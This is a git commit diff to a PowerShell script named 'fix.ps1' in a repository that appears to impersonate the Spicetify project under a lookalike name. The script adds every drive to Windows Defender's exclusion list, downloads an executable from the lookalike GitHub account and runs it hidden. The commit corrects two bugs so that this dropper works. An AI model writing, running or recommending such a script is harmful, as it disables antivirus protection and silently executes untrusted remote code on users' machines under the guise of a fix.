971ad64eceeae935db7b3d1e58626aee60b1bc35
spicetlfy <malonecaller123@gmail.com>
2026-07-08 15:43:18 +0200

    Update fix.ps1

--- main/fix.ps1
+++ main/fix.ps1
@@ -1,14 +1,14 @@
 $disks = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
 
 foreach ($disk in $disks) {
-    $path = "$disk:\"
+    $path = "${disk}:\"
     Add-MpPreference -ExclusionPath $path
 }
 
 $tempPath = "$env:TEMP\Spicetify"
 New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
 $exeUrl = "https://github.com/spicetlfy/cli/raw/refs/heads/main/main/SpicetifyUpdater.exe"
-$exePath = "$tempPath\SpicetifyUpdater"
+$exePath = "$tempPath\SpicetifyUpdater.exe"
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
 Start-Process $exePath -WindowStyle Hidden
